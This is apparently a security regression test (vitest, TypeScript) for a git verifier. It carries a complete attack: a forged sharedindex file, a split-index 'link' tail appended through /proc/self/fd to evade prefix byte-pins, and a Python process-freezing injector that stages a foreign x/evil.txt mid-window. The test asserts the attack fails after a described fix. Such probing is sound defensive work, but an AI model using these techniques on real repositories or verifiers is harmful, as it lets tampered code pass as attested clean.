/*
RFC-1616 round-31 independent adversarial probes — candidate commit
8f18df089, exported tree.

CX-r31-B — the r30-B byte-pins compare a PREFIX, never the file: every
claims-index fd re-prove (`evidenceSpawnState`, verifier-git.ts:919-928;
`claimsFdPin`, :3712-3725 + :3813-3825) reads `idx.bytes.length` bytes at
offset 0 and compares — a same-UID APPEND past the pinned length is
invisible to every pin, while `git`'s DIRC parser walks extensions right
after the entries: the image's own 20-byte trailing hash sits mid-stream
and is read as the first extension header. Grind the claims content until
sha[0] lands in 'A'-'Z' (unknown REQUIRED-name exts abort; unknown
"optional" names print `ignoring` and are SKIPPED — read-cache.c) and
u32be(sha[4:8]) lands inside the appended region: the walker hops past the
hash into a `link` (split-index) extension redirecting every claims-child
entry enumeration to `.git/sharedindex.<sha>` — a file whose events AND
stat-pins `anchoredMutationIgnorable` drops wholesale for `add`/`reset`
(verifier-git.ts:3599-3604, 3655, 3729-3732).

`git`'s split-index read freshens the base (`utime` → ctime bump →
fingerprint drift for `add`, whose `enumerateTrackedRuleSources` runs a
claims child BEFORE the window arms — add is refused, observed). `reset`
runs no claims child pre-arm: the freshen lands INSIDE the window as an
ignored sharedindex.* event, and anchored ops skip the post-window
`reproveEvidenceSurface` (:5295 `opts?.anchored === undefined` guard).
The symlink target dodge is unnecessary for reset — the file itself is
ignored — but harmless.

Attack shape — planted state for the image, one mid-window index write:

  1. Grind pad entry NAME offline → claims sha shape (no git calls).
  2. Plant `.git/sharedindex.<sha>` = self-consistent index image =
     honest claims + foreign `x/evil.txt` stage.
  3. `evidenceRepoPreflight` mints the claims fd = honest image; append
     the `link` tail through `/proc/self/fd/N` (the named-fallback claims
     fd is opened read-only but the inode is same-UID writable).
  4. `evidenceAnchoredGit(reset -q -- d)`: injector lands `x/evil.txt`
     in the real `.git/index` inside the armed window (index events are
     the op's own surface — r30-B's gap). Coverage: `runClaims` merges
     the forged base → claimsMap ≡ liveMap (incl. evil) → `changed`
     misses the foreign stage → `diff --cached HEAD -- d` is spec-scoped
     → exit 0 attests a clean staged set while `:x/evil.txt` resolves.

Fix: every fd byte-pin now checks `fstatSync().size` alongside the
prefix compare — a `/proc/<pid>/fd` APPEND preserves the pinned prefix
while tacking a `link` extension onto the inode. Covered at all three
readback sites: `evidenceSpawnState`'s spawn-time re-prove, the
`claimsFdPin` settle check (which also pins the minted `claims.bytes`
directly, so a pre-arm rewrite can't launder itself as baseline), and
the `liveIndex` fd-form settle. Path-form held files already
byte-compared full content — appends were caught there.
*/

import { execFileSync, spawn, spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import {
  closeSync,
  mkdirSync,
  mkdtempSync,
  openSync,
  rmSync,
  writeFileSync,
  writeSync,
} from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";

import { evidenceAnchoredGit, evidenceRepoPreflight } from "../../../src/utils/verifier-git.ts";

const tmpdirs: string[] = [];
afterEach(() => {
  while (tmpdirs.length > 0) rmSync(tmpdirs.pop()!, { recursive: true, force: true });
});

const git = (root: string, args: string[], input?: string) =>
  execFileSync("git", ["-C", root, ...args], { encoding: "utf8", input }).trim();

/** Verbatim replica of the verifier's `serializeIndexClaims`. */
const claimsImageOf = (stageListing: string): Buffer => {
  const entries: { mode: number; sha: Buffer; stage: number; name: Buffer }[] = [];
  for (const rec of stageListing.split("\0")) {
    if (rec.length === 0) continue;
    const tab = rec.indexOf("\t");
    const m = /^([0-7]+) ([0-9a-f]{40}|[0-9a-f]{64}) ([0-3])$/.exec(rec.slice(0, tab));
    if (m === null || tab === -1) throw new Error(`bad claim ${rec}`);
    entries.push({
      mode: parseInt(m[1]!, 8),
      sha: Buffer.from(m[2]!, "hex"),
      stage: Number(m[3]),
      name: Buffer.from(rec.slice(tab + 1), "utf8"),
    });
  }
  entries.sort((a, b) =>
    Buffer.compare(a.name, b.name) !== 0 ? Buffer.compare(a.name, b.name) : a.stage - b.stage,
  );
  const shaBytes = entries.find((c) => c.sha.length === 32) ? 32 : 20;
  const longName = entries.some((c) => c.name.length > 0xfff);
  const fixedLen = 40 + shaBytes + 2;
  const parts = entries.map((c) => {
    const rawLen = fixedLen + c.name.length;
    const e = Buffer.alloc(Math.ceil((rawLen + 1) / 8) * 8);
    e.writeUInt32BE(c.mode, 24);
    c.sha.copy(e, 40);
    e.writeUInt16BE((c.stage << 12) | Math.min(c.name.length, 0xfff), 40 + shaBytes);
    c.name.copy(e, 40 + shaBytes + 2);
    return e;
  });
  const hdr = Buffer.alloc(12);
  hdr.write("DIRC");
  hdr.writeUInt32BE(longName ? 3 : 2, 4);
  hdr.writeUInt32BE(entries.length, 8);
  const body = Buffer.concat([hdr, ...parts]);
  const dig = createHash(shaBytes === 32 ? "sha256" : "sha1");
  dig.update(body);
  return Buffer.concat([body, dig.digest()]);
};

const EWAH_EMPTY = Buffer.alloc(12); // empty ewah bitmap: nwords=0, rlw=0, bitsize=0
const NUL = "\0";

const mkRepo = () => {
  const root = mkdtempSync(path.join(os.tmpdir(), "cx31b-"));
  tmpdirs.push(root);
  execFileSync("git", ["init", "-q", "-b", "main", root]);
  git(root, ["config", "user.email", "t@t"]);
  git(root, ["config", "user.name", "t"]);
  writeFileSync(path.join(root, "f.txt"), "v1\n");
  git(root, ["add", "f.txt"]);
  git(root, ["commit", "-qm", "c1"]);
  return root;
};

/**
 * Hold-open index injection (r30-B convention): freeze the verifier's
 * `reset` child on first /proc sight, retry `update-index --index-info`
 * until the foreign stage lands (post-lock-release), resume both.
 */
const startIndexInjector = (cmd: string, secs = 60) => {
  const script =
    "import os,sys,time\n" +
    "pid=int(sys.argv[1]); cmd=sys.argv[2]; end=time.time()+float(sys.argv[3]); seen=set(); retries={}; me=str(os.getpid()); done=False\n" +
    "def kids():\n" +
    "    out=[]\n" +
    "    try:\n" +
    "        for t in os.listdir('/proc/%s/task'%pid):\n" +
    "            try: out += open('/proc/%s/task/%s/children'%(pid,t)).read().split()\n" +
    "            except: pass\n" +
    "    except: pass\n" +
    "    return out\n" +
    "while time.time()<end and not done:\n" +
    "    for k in kids():\n" +
    "        if k in seen or k==me: continue\n" +
    "        try: os.kill(int(k),19)\n" +
    "        except: seen.add(k); continue\n" +
    "        try: c=open('/proc/%s/cmdline'%k,'rb').read()\n" +
    "        except: c=b''\n" +
    "        av=c.split(b'\\0')\n" +
    "        a0=av[0]\n" +
    "        ambig=(a0==b'' or a0.endswith(b'/node') or a0==b'node' or a0.endswith(b'/python3'))\n" +
    "        if len(av)>1 and (b'reset' in av[1:]):\n" +
    "            try: os.kill(pid,19)\n" +
    "            except: pass\n" +
    "            try: os.kill(int(k),18)\n" +
    "            except: pass\n" +
    "            rc=-1\n" +
    "            for _ in range(400):\n" +
    "                rc=os.system(cmd)\n" +
    "                if rc==0: break\n" +
    "                time.sleep(0.001)\n" +
    "            try: os.kill(pid,18)\n" +
    "            except: pass\n" +
    "            done=True\n" +
    "        elif (a0 and not ambig):\n" +
    "            seen.add(k)\n" +
    "            try: os.kill(int(k),18)\n" +
    "            except: pass\n" +
    "        else:\n" +
    "            n=retries.get(k,0)+1; retries[k]=n\n" +
    "            if n>400: seen.add(k)\n" +
    "            try: os.kill(int(k),18)\n" +
    "            except: seen.add(k)\n" +
    "    time.sleep(0.00002)\n";
  const child = spawn("python3", ["-c", script, String(process.pid), cmd, String(secs)], {
    stdio: "ignore",
  });
  child.unref();
  return {
    stop: () => {
      try {
        child.kill("SIGKILL");
      } catch {
        /* done */
      }
    },
  };
};

const HAS_PY = spawnSync("python3", ["--version"]).status === 0;
const APPEND_LEN = 1 << 28; // 256 MiB tail — sha-window hit ≈0.6%/grind

describe("CX-r31-B: appended `link` tail on the claims fd forges the staged-set basis", () => {
  it(
    "sharedindex redirect on the held claims fd attests a foreign stage — anchored reset exits 0 with x/evil.txt staged",
    { timeout: 300_000 },
    async (ctx) => {
      if (!HAS_PY) return ctx.skip();
      let forged = 0;
      let refused = 0;
      let honest = 0;
      let lastErr = "";
      for (let attempt = 0; attempt < 30 && forged === 0; attempt++) {
        const root = mkRepo();
        mkdirSync(path.join(root, "d"), { recursive: true });
        writeFileSync(path.join(root, "d", "normal.txt"), "n\n");
        git(root, ["add", "d/normal.txt"]);
        // Offline grind: vary the pad entry NAME until the claims image's
        // trailing sha has (a) H[0] in 'A'-'Z' (skipped "optional" ext
        // name — lowercase/odd names die "do not understand"), and
        // (b) u32be(H[4:8]) inside the appended region.
        const fSha = git(root, ["rev-parse", ":f.txt"]);
        const dSha = git(root, ["rev-parse", ":d/normal.txt"]);
        const padSha = git(root, ["hash-object", "-w", "--stdin"], "P\n");
        const rec = (sha: string, p: string) => `100644 ${sha} 0\t${p}${NUL}`;
        let claimsImg: Buffer | null = null;
        let padName = "";
        let V = 0;
        let g = 0;
        for (; g < 200000; g++) {
          padName = `pad${g}.txt`;
          claimsImg = claimsImageOf(
            rec(fSha, "f.txt") + rec(padSha, padName) + rec(dSha, "d/normal.txt"),
          );
          V = claimsImg.readUInt32BE(claimsImg.length - 16);
          const h0 = claimsImg[claimsImg.length - 20]!;
          if (h0 >= 0x41 && h0 <= 0x5a && V >= 12 && V <= APPEND_LEN - 68) break;
        }
        expect(V).toBeGreaterThanOrEqual(12);
        writeFileSync(path.join(root, padName), "P\n");
        git(root, ["add", padName]);
        // Sanity: the verifier-side serializer is byte-exact.
        expect(claimsImageOf(git(root, ["ls-files", "--stage", "-z"])).equals(claimsImg!)).toBe(
          true,
        );
        // Foreign blob + planted sharedindex base (honest claims + evil).
        const foreign = git(root, ["hash-object", "-w", "--stdin"], "FORGED\n");
        const baseImg = claimsImageOf(
          rec(fSha, "f.txt") +
            rec(padSha, padName) +
            rec(dSha, "d/normal.txt") +
            rec(foreign, "x/evil.txt"),
        );
        const baseSha = baseImg.subarray(baseImg.length - 20).toString("hex");
        writeFileSync(path.join(root, ".git", `sharedindex.${baseSha}`), baseImg);
        const pre = await evidenceRepoPreflight(root);
        expect(pre).not.toBeNull();
        if (pre!.index?.fd === undefined) {
          console.log("no held claims fd — path-form environment, skipping");
          return ctx.skip();
        }
        const bytes = pre!.index!.bytes;
        const pinnedLen = bytes.length;
        const payload = Buffer.concat([
          baseImg.subarray(baseImg.length - 20),
          EWAH_EMPTY,
          EWAH_EMPTY,
        ]);
        const tail = Buffer.alloc(APPEND_LEN - 20);
        tail.write("link", V - 12, "ascii");
        tail.writeUInt32BE(44, V - 8);
        payload.copy(tail, V - 4); // [V-4, V+40)
        tail.write("ZZZZ", V + 40, "ascii");
        tail.writeUInt32BE(APPEND_LEN - 68 - V, V + 44);
        const img2 = Buffer.concat([bytes, tail]);
        const full = Buffer.concat([img2, createHash("sha1").update(img2).digest()]);
        // Same-UID write channel: the held fd is opened read-only, but
        // the inode is writable through a /proc re-open (fresh inode open
        // on a 0600 same-UID file — same for the named fallback whose
        // unlink already ran, and for O_TMPFILE upstream).
        const wfd = openSync(`/proc/self/fd/${pre!.index!.fd}`, "r+");
        writeSync(wfd, full.subarray(pinnedLen), 0, APPEND_LEN, pinnedLen);
        closeSync(wfd);
        const injector = startIndexInjector(
          `printf '100644 ${foreign} 0\\tx/evil.txt\\n' | git -C '${root}' update-index --index-info`,
          60,
        );
        try {
          const r = await evidenceAnchoredGit(root, ["reset", "-q", "--", "d"], {
            preflight: pre!,
          });
          if (r.exitCode === -1) {
            refused++;
            lastErr = r.stderr.slice(0, 140);
          } else {
            let staged = "";
            try {
              staged = git(root, ["rev-parse", ":x/evil.txt"]);
            } catch {
              staged = "";
            }
            if (r.exitCode === 0 && staged === foreign) forged++;
            else honest++;
          }
        } finally {
          injector.stop();
        }
      }
      console.log(
        `claims-fd link-tail (reset): forged=${forged} refused=${refused} honest=${honest} last=${lastErr}`,
      );
      expect(forged).toBe(0);
    },
  );

  it("control: quiet window — reset exits 0, d unstaged, no foreign entry", async () => {
    const root = mkRepo();
    mkdirSync(path.join(root, "d"), { recursive: true });
    writeFileSync(path.join(root, "d", "normal.txt"), "n\n");
    git(root, ["add", "d/normal.txt"]);
    const pre = await evidenceRepoPreflight(root);
    expect(pre).not.toBeNull();
    const r = await evidenceAnchoredGit(root, ["reset", "-q", "--", "d"], { preflight: pre! });
    expect(r.exitCode).toBe(0);
    const staged = git(root, ["ls-files", "-s"]);
    expect(staged).not.toContain("d/normal.txt");
    expect(staged).not.toContain("evil");
  });
});
